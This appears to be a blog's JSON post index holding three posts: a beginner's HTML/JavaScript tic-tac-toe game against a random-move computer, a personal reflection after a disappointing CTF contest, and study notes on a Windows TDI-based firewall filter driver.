Crosses","slug":"javascript-naughts-and-crosses","date":"2018-01-24T05:00:13.000Z","updated":"2018-10-18T10:25:23.617Z","comments":true,"path":"2018/01/24/javascript-naughts-and-crosses/","link":"","permalink":"http://siriuswhiter.tk/2018/01/24/javascript-naughts-and-crosses/","excerpt":"","text":"转移自之前的博客 学习html,js,css一周做了个粗糙的人机井字棋，虽然很丑，但是有彩蛋啊，比如说：黑白图片来自我c语言课设那刷屏的烫烫烫hhh。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;澳门皇家赌场&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1&#123;color:blue;&#125;table&#123;background-color:rgb(182,194,154);width:450px;height:450px;&#125;body&#123;background-color:rgb(131,175,155);&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; &gt;alert(&quot;欢迎来到棋牌室！&quot;);var a=new Array(10)for(var i=0;i&lt;9;i++)a[i]=0;function start()&#123;for(var i=0;i&lt;9;i++)&#123; a[i]=0;document.getElementById(&quot;srci&quot;+String(i)).src=&quot;back.png&quot;;&#125;&#125;coun=0;function restart()&#123;window.location.reload();&#125;function img_change(id)&#123;var x=1;while(x==1)&#123;if(id==&quot;div0&quot;&amp;&amp;a[0]==0)&#123;a[0]=1;document.getElementById(&quot;srci0&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div1&quot;&amp;&amp;a[1]==0)&#123;a[1]=1;document.getElementById(&quot;srci1&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div2&quot;&amp;&amp;a[2]==0)&#123;a[2]=1;document.getElementById(&quot;srci2&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div3&quot;&amp;&amp;a[3]==0)&#123;a[3]=1;document.getElementById(&quot;srci3&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div4&quot;&amp;&amp;a[4]==0)&#123;a[4]=1;document.getElementById(&quot;srci4&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div5&quot;&amp;&amp;a[5]==0)&#123;a[5]=1;document.getElementById(&quot;srci5&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div6&quot;&amp;&amp;a[6]==0)&#123;a[6]=1;document.getElementById(&quot;srci6&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div7&quot;&amp;&amp;a[7]==0)&#123;a[7]=1;document.getElementById(&quot;srci7&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div8&quot;&amp;&amp;a[8]==0)&#123;a[8]=1;document.getElementById(&quot;srci8&quot;).src=&quot;timg.png&quot;;x=0;&#125;elsereturn;&#125;if(!(winner()))&#123;coun++;Robots_Time();&#125;if(!(winner())&amp;&amp;coun==9)alert(&quot;draw&quot;);&#125;function Robots_Time()&#123;var z=1;while(z==1)&#123;var ran=Math.random()*9;ran=parseInt(ran);if(a[ran]==0)&#123;a[ran]=2;document.getElementById(&quot;srci&quot;+String(ran)).src=&quot;white.png&quot;;coun++;z=0;&#125;&#125;winner();&#125;function winner()&#123;if(a[0]==2&amp;&amp;a[1]==2&amp;&amp;a[2]==2||a[0]==2&amp;&amp;a[4]==2&amp;&amp;a[8]==2||a[0]==2&amp;&amp;a[3]==2&amp;&amp;a[6]==2)&#123;alert(&quot;You failed&quot;);return 1;&#125;elseif(a[1]==2&amp;&amp;a[4]==2&amp;&amp;a[7]==2||a[2]==2&amp;&amp;a[5]==2&amp;&amp;a[8]==2||a[3]==2&amp;&amp;a[4]==2&amp;&amp;a[5]==2)&#123;alert(&quot;You failed&quot;);return 1;&#125;elseif(a[2]==2&amp;&amp;a[4]==2&amp;&amp;a[6]==2||a[6]==2&amp;&amp;a[7]==2&amp;&amp;a[8]==2)&#123;alert(&quot;You failed&quot;);return 1;&#125;if(a[0]==1&amp;&amp;a[1]==1&amp;&amp;a[2]==1||a[0]==1&amp;&amp;a[4]==1&amp;&amp;a[8]==1||a[0]==1&amp;&amp;a[3]==1&amp;&amp;a[6]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elseif(a[1]==1&amp;&amp;a[4]==1&amp;&amp;a[7]==1||a[2]==1&amp;&amp;a[5]==1&amp;&amp;a[8]==1||a[3]==1&amp;&amp;a[4]==1&amp;&amp;a[5]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elseif(a[2]==1&amp;&amp;a[4]==1&amp;&amp;a[6]==1||a[6]==1&amp;&amp;a[7]==1&amp;&amp;a[8]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elsereturn 0;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;table border=&quot;1&quot;cellpadding=&quot;1&quot;cellspacing=&quot;1&quot;align=&quot;center&quot;&gt;&lt;caption&gt;Play with NPC&lt;audio loop=&quot;loop&quot; autoplay=&quot;autoplay/&quot;&gt;&lt;source src=&quot;I Need To Be In Love.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&lt;/caption&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div0&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci0&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div1&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci1&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div2&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci2&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div3&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci3&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div4&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci4&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div5&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci5&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div6&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci6&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div7&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci7&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div8&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci8&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;center&gt;&lt;button onclick=&quot;restart()&quot;&gt;重新开始&lt;/button&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 附地址：点击与愚蠢的电脑过招井字棋，输了算你牛","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"一点牢骚","slug":"一点牢骚","date":"1919-06-03T00:49:01.000Z","updated":"2019-06-04T04:41:59.483Z","comments":true,"path":"1919/06/03/一点牢骚/","link":"","permalink":"http://siriuswhiter.tk/1919/06/03/一点牢骚/","excerpt":"","text":"昨天打完信安大赛的华中地区赛，真的是被打到自闭。实在是没想到水平会倒退的这么厉害，或许是本来就这么菜呢。因为这一学期来了之后各种诡异的状态加上后面忙成狗的课加课设，直接将pwn给荒废了很久，本来以为学了就可以随便信手拈来的技巧，在赛场上才感觉到自己的水平有多差，第一天的题实际上不能算是特别难，除了第一道栈拿了三血，其他的本来以为最最擅长的fastbin都tm做不出来，时间稍微长一些，便连各种管理规则都忘得差不多，直到出现报错，才能够想起来有这样那样的检查，甚至在第一天完了之后，我才逐渐想到那个疯狂耗费时间的题的后半段时间都是在一条错误的思路上前进，犯了刚开始做堆时的傻逼错误。 感觉到了自己有多自大，多煞笔。可能这就是所谓的一瓶不满，半瓶晃荡吧。学到了一些皮毛，就以为自己多么多么厉害，虽然知道自已与其他大佬的差距，但是不愿去接收，只是想着虽然他怎么样怎么样，但是我还咋咋咋的。我记得有人说，过分的谦虚实际上是骄傲，我不知道自己有没有这样过分谦虚，但是我能感觉到自己那即将漫出来的骄傲自大。我不知道怎样控制，本身一个人的性格如此，容易满足便容易骄傲。我向来是一个容易满足的人，我只愿做个谦卑的人。现在常说当今社会多么多么浮躁，我一直以为自己不是他们中的一员，或许我曾经不是，但是我现在一定是了。实话说，太容易迷茫了，我记得有人说，迷茫是因为太闲了，可是我觉得不是，忙忙碌碌与迷茫是不冲突的，甚至忙碌的人更容易迷茫。曾经很容易忘记自己到底为什么要做一件事。我甚至不记得我大一下学期那挣扎许久想出来人活着的理由，这实际上是很悲哀的。我耗费那么大的精力时间去思考，在终于说服了自己之后，我却忘了怎么说服的自己。 我记得在上大学之前，他们告诉我，当许多年之后你想起你的青春，你可能印象深刻的是你努力学习的时光而不是娱乐的时光，或许是因为还没有过好多年，我的高中记忆已经越来越少，而令我印象深刻的，是那个周六的下午在窗口晒太阳听歌看书的情形，那或许才是我想要的生活。我不像那些与我一同敲代码或是打比赛的人一样有多么的热爱计算机，计算机让我感觉有意思，pwn让我感觉有意思，但都仅限于此了。我感受不到那种发自内心的喜爱，老实说，我甚至想不到多少能够让自己发自内心喜爱的事物。这个角度来讲，计算机，pwn实际上都挺好的，只是它们完全改变了我的生活轨迹，我也不知是好是坏。虽然报专业的时候基本上没报什么计算机相关的专业，但或许是命中注定吧，如果我命中注定要与计算机为伍，我也不愿去排斥。 太久没写过东西了，懒得在日记本上写了，就在这里发发牢骚，随便东扯西扯。实话说，能够自闭这么久，感觉整个人都要崩溃了。人在自闭的时候，会想要逃避，前些天是想去参军来着，一份逃避，一份参军的心。但是因为这傻逼皮肤病，甚至没法去报。这个时候真的不知道该怎么办了，之前和老爸通过电话谈参军的事，不久就被揭穿了想逃避的心理。压力大的时候不敢跟家里人打电话了，太容易想哭了，真的不想让他们多担心。自己扛着就好了。这么大的人整天胡思乱想，我也不知道如何是好了。相信一切都会过去的吧。 这个学期还剩一个月就过去了，之后就要搬到新校区了，原先是计划找个实习的，但是这次比赛让我想放弃这个选项了，回家潜心修炼也是一个不错的选项。最终结果如何，到时候都会知道了。 罢了，就这样吧，一切终将尘埃落定。","categories":[],"tags":[]},{"title":"基于TDI的防火墙部分实现笔记","slug":"基于tdi的防火墙部分实现笔记","date":"1919-05-30T08:55:25.000Z","updated":"2019-05-30T09:04:56.157Z","comments":true,"path":"1919/05/30/基于tdi的防火墙部分实现笔记/","link":"","permalink":"http://siriuswhiter.tk/1919/05/30/基于tdi的防火墙部分实现笔记/","excerpt":"","text":"TDI 过滤框架：wdm.h定义了PDRIVER_OBJECT结构体类型 tdi_fw.c c_n_a_device： 驱动生成设备 d_n_d_device：删除设备 Devicepatch：唯一的设备分发函数 ，如果能get_original_devobj找到old_devobj就调用IoSkipCurrentIrpStackLocation栈中得到请求,再IoCallDriver将二者发到下层（实际：对请求（IRP）的主功能号（irps-&gt;MajorFunction）进行处理。(ps:次功能号：irps-&gt;MiniorFunction)对于特定请求：如IRP_MJ_CREATE ，先tdi_create 进行过滤得到结果，tdi_dispatch_complete 为完成函数，通过result来进行处理 get_origin_devobj tcp/ip/udp 三对设备及其指针匹配 框架 Onload 删除＋解绑所有已生成和绑定的设备 DriverEntry 驱动入口＋分发函数+生成过滤设备并绑定三种设备（c_n_a_device) 过滤生成请求disp_obj.c： tdi_create: 对于 IRP_MJ_CREATE 请求的过滤 ，生成一个文件对象有两种可能： TdiTransportAddress：表明生成传输层地址 TdiConnectionContext： 表明生成连接终端 TDI先生成1，再2，再用控制请求将二者连接起来 1.1 生成传输层地址时。询问被打开的文件对象来获得ip地址和端口，调用TdiBuildInternalDeviceControlIrp分配空的请求,此请求需要在Passive Level 进行调用Ps: 完成函数一般在DisPatch level 2.1 连接终端的结构：CONNECTION_CONTEXT， 可以从ea中得到 为了将 文件对象 与 连接上下文 对应起来，可以使用hash表存储（ot_add_fileobj）同理存储 文件对象 与 生成地址 对应起来 tdi_create_addrobj_complete/2 从上面的生成的传输层地址得到生成的IP地址（32位长整数即4字节）和端口（16字节整数） 控制请求disp_obj.c 两种控制请求（起相同的作用）： IRP_MJ_DEVICE_CONTROL：应用层向驱动层发送设备 IRP_MJ_INTERNAL_DEVICE_CONTROL：内核内部发送设备控制命令 次功能号有： TDI_ASSOCIATE_ADDRESS：将传输层地址对象(IP)和连接对象(FileObj)连接起来,即与连接终端中使用hash表存储的文件对象与连接上下文这个组合连接。使得：得到连接上下文对象时，能够立刻知道使用的本地地址。方法：从栈空间参数中得到上面传入的传输层地址的文件的句柄并将其转化（ObReferenceObjectByHandle）为文件对象指针（addrobj）,ot_find_fileobj找到保存过这个连接上下文所对应的表单元ote_conn，使用ote_conn-&gt;associated_fileobj= addrobj 将其连接使得：将 连接上下文指针 与 地址文件对象指针 连接起来。 //？？上面？方法：使用另一个表：ot_add_conn_ctx 三者互联： 连接上下文指针–地址文件对象指针–传输层地址 TDI_DISASSOCIATE_ADDRESS上面功能的反向 TDI_CONNECT本地试图连接外界时会发生的请求a. @1. 用户进程使用的本机地址：获取当前请求的当前栈空间，判断请求类型然后得到以前保存的连接对象和传输层地址等等。b. @2. 用户试图连接的远程地址：从irps的参数中得到。 TDI_SEND/TDI_RECEIVE流式传输，对应TCP使得：得到连接及相关信息方法：irps-&gt;FileObject 就是连接的文件对象，信息保存在ote_conn中，可以得到连接上下文的指针，地址端口等使得：得到要发送或接收的数据方法：irp-&gt;MdlAddress就是含有数据的MDL的指针 TDI_SEND_DATAGRAM/TDI_RECEIVE_DATAGRAM报式传输，对应UDP使得：获取地址方法：因为没有连接的概念，所以查询到的直接就是ote_addr其他与tcp一致 TDI_SET_EVENT_HANDLER设置事件回调请求，即侦听，当外部连接我方端口时回调函数被调用EventType 事件种类，EventHandler 回调函数 直接获取发送函数的过滤 Netbt(基于TCP/IP的NetBios协议），在IRP_MJ_DEVICE_CONTROL的功能码为IOCTL_TDI_QUERY_DIRECT_SEND_HANDLER时，直接获取TCP协议驱动的内部函数TCPSenddata的指针来进行数据发送，即不通过TDI_SEND请求处理：tcpsenddata在调用后会返回在DeviceIoControl.Type3InputBuffer可以因此获得指针之后调用tdi_dispatch_complete让真实设备完成请求，之后将结果进行转换 清理请求的过滤IRP_MJ_CLEANUP将IRP_MJ_DEVICE_CONTROL尝试转换为IRP_MJ_INTERNAL_CONTROL，转换不成功直接下发，成功则视为internal来进行过滤","categories":[{"name":"kernel","slug":"kernel","permalink":"http://siriuswhiter.tk/categories/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"http://siriuswhiter.tk/tags/kernel/"},{"name":"firewall","slug":"firewall","permalink":"http://siriuswhiter.tk/tags/firewall/"}]}]}